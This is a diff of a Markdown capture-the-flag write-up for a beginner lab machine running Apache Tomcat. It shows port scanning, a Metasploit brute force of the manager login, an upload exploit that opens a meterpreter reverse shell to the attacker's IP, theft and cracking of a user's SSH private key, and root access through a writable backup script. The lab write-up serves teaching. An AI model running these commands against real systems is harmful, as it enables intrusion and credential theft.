@@ -8,19 +8,23 @@ Level: Easy (For Beginners)
 ## **Methodology:**
 
 **Network scanning**
+
 - nmap
-- naabu 
+- naabu
 
 **Enumeration**
--   Abusing HTTP
+
+- Abusing HTTP
 
 **Exploitation**
--   Metasploit
--   John the Ripper
+
+- Metasploit
+- John the Ripper
 
 **Privilege Escalation**
--   writable script
--   Capture the Flag
+
+- writable script
+- Capture the Flag
 
 ---
 
@@ -37,9 +41,10 @@ Further, we ran scan for open port enumeration where we found the following port
 - `echo 10.10.139.12 | naabu -nmap-cli 'nmap -sV -oX nmap-output'`
 
 According to the Nmap output, we get
--   on port 22 SSH server running (OpenSSH)
--   on port 8080 HTTP service running (Apache tomcat)
-- ![[Pasted image 20220925224028.png]]
+
+- on port 22 SSH server running (OpenSSH)
+- on port 8080 HTTP service running (Apache tomcat)
+- ![](images/naabu.png)
 
 ### **Enumeration**
 
@@ -48,11 +53,14 @@ According to the Nmap output, we get
 Now let’s see if we can get any interesting information from port 8080. Because the Apache Tomcat Server is running on port 8080, we can see the result right away in the browser.
 
 We note the Tomcat version number: 9.0.52
+
 > URL:  **10.10.139.12:8080**
-- ![[Pasted image 20220925224228.png]]
+
+- ![](images/website.png)
 
 Here is a Login page
-- ![[Pasted image 20220925224812.png]]
+
+- ![](images/userpasslogin.png)
 
 ### **Exploitation**
 
@@ -60,42 +68,40 @@ Here is a Login page
 
 Now, let’s start msfconsole. We will be using the auxiliary scanner to bruteforce tomcat manager login. Here we are using Metasploit default wordlist for password brute force attack.
 
-- msfconsole 
-- ![[Pasted image 20220925224745.png]]
+- msfconsole
+- ![](images/msf.png)
 
 - > `search tomcat login`
-- 
-![[Pasted image 20220925224926.png]]
+- ![](images/tomact_mg_login.png)
 - `use 0`
-- `options` 
-- ![[Pasted image 20220925225003.png]]
+- `options`
+- ![](images/mgr_login_options.png)
 - `set RHOSTS 10.10.139.12`
 - `exploit`
-- ![[Pasted image 20220925225346.png]]
+- ![](images/userpass.png)
 - tomcat:role1
 - login
 
 - Upload functionality
-- ![[Pasted image 20220925225652.png]]
+- ![](images/upload_website_options.png)
 
 - `ifconfig`
 - my vpn ip: `10.17.66.156`
-- ![[Pasted image 20220925230031.png]]
-
+- ![](images/vpn_ip_check.png)
 
 - `search tomcat upload mgr`
-- ![[Pasted image 20220925225753.png]]
+- ![](images/tomact_mgr_upload.png)
 
 - use 1
 - options
-	- `set HttpUsername tomcat`
-	- `set HttpPassword role1`
-	- `set RHOSTS 10.10.139.12`
-	- `set RPORT 8080`
-	- `set LHOST 10.17.66.156`
-	- ![[Pasted image 20220925230425.png]]
+  - `set HttpUsername tomcat`
+  - `set HttpPassword role1`
+  - `set RHOSTS 10.10.139.12`
+  - `set RPORT 8080`
+  - `set LHOST 10.17.66.156`
+  - ![](images/Pasted image 20220925230425.png)
 - exploit
-	- ![[Pasted image 20220925230522.png]]
+  - ![](images/meterpreter_shell.png)
 
 After getting the meterpreter shell we navigate to the ‘home’ directory and there we can find a sub-directory named ‘thales’. Entering the ‘thales’ directory we get two files: **user.txt** and **notes.txt.** We also find a **.ssh** directory.
 
@@ -103,32 +109,32 @@ After getting the meterpreter shell we navigate to the ‘home’ directory and 
 - `ls`
 - `cd thales`
 - `ls`
-	![[Pasted image 20220925231316.png]]
+  ![](images/ls_home_thales.png)
 
 We observe that the public key (id_rsa.pub) and the private key(id_rsa) are present on the victim machine. The private key is used to login. So now we proceed to download the private key onto our kali machine.
-
 
 cd .ssh
 
 ls
 
 download id_rsa /root/Desktop
-![[Pasted image 20220925232031.png]]
-
+![](images/download_id_rsa.png)
 
 locate ssh2john
 
 /usr/share/john/ssh2john.py id_rsa > sshhash
 
 john --wordlist=/usr/share/wordlists/rockyou.txt sshash
-![[Pasted image 20220925232934.png]]
+![](images/john_crack.png)
 
 found: vodka06
 
 go back to your meterpreter
+
 - `shell`
 
 After we get a shell, we will upgrade our non-interactive shell to a partially interactive one using the following command:
+
 - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 - `export TERM=xterm`
 
@@ -136,7 +142,7 @@ Since we have cracked the password of user ‘thales’, let’s switch to the t
 `su thales`
 After switching to thales user, we use the command “**id**” to know about the real and effective ‘user and group’ IDs. We find that thales is a non-root user.
 
-![[Pasted image 20220925233823.png]]
+![](images/thales_password.png)
 
 cat the users.txt now
 
@@ -148,15 +154,14 @@ We find that user thales does not have the ability to run any command as root. S
 
 We get a hint on note.txt that a backup script is prepared for us in the directory **/usr/local/bin/backup.sh**
 
-![[11 1.png]]
+![](images/backup_explain.png)
 
 Now, let’s go and check the backup.sh file. We investigate and find that this file has read, written, and execute permissions and the file is owned by the root.
 
 - `cat /usr/local/bin/backup.sh`
 - `ls -la /usr/local/bin/backup.sh`
 
-![[12.png]]
-
+![](images/backup.sh.png)
 
 ---
 
@@ -180,5 +185,3 @@ since it was a backup script that run automatically, thus it will give root priv
 - `cd /root`
 - `ls`
 - `cat root.txt`
-
-![[Pasted image 20221210182443.png]]
